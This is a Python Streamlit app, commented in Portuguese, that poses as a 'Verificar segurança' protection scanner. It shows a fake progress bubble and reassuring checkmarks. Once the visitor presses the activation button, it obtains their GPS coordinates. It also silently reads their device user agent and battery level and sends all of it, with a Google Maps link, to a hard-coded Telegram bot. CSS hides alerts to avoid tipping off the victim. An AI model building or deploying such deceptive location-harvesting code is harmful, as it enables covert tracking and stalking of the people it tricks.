import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Sistema de Segurança", layout="centered")

# 2. CSS: BOLHA + MATAR AVISOS AMARELOS (REFORÇADO)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    /* SOME COM OS AVISOS AMARELOS QUE TE IRRITAM */
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.8em; border-radius: 12px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE INICIAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Captura modelo e bateria silenciosamente
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_FINAL')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')

if 'clicou' not in st.session_state:
    st.session_state['clicou'] = False

# Bolha estática em 4%
if not st.session_state['clicou']:
    with caixa_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. O BOTÃO (QUE VAI FORÇAR O POP-UP)
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['clicou'] = True

# 5. LÓGICA DE CAPTURA E ANIMAÇÃO
if st.session_state['clicou']:
    # Chamada do GPS que abre a tela de "Precisão de Local"
    loc = get_geolocation() 
    
    if loc and 'coords' in loc:
        # SUCESSO: Os números começam a girar de 4% a 100%
        for p in range(4, 101, 6):
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)
        
        # Envio dos dados para o Telegram
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("Localização concluída")
        st.session_state['clicou'] = False
